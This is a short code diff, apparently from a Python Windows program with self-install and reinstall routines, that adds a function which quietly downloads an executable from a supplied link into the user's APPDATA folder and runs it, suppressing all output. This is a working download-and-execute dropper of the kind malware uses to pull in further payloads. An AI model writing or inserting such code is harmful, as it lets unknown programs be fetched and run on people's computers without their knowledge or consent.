@@ -135,6 +135,35 @@ def remove_force():
             except PermissionError:
                 time.sleep(0.3)
 
+def download_and_run_random_program(link, base_name="info", ext=".exe"):
+    roaming = os.environ["APPDATA"]
+
+    i = 0
+    while True:
+        name = f"{base_name}{i if i > 0 else ''}{ext}"
+        path = os.path.join(roaming, name)
+        if not os.path.exists(path):
+            break
+        i += 1
+
+    result = subprocess.run(
+        ["curl.exe", "-fL", link, "-o", path],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+
+    if result.returncode != 0:
+        return None
+
+    # roda corretamente
+    subprocess.run(
+        [path],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+
+    return path
+
 def reinstall_program(standartInstall=True):
     if standartInstall:
         if not os.path.isfile(exe_final_location) and not os.path.isfile(old_final_location):
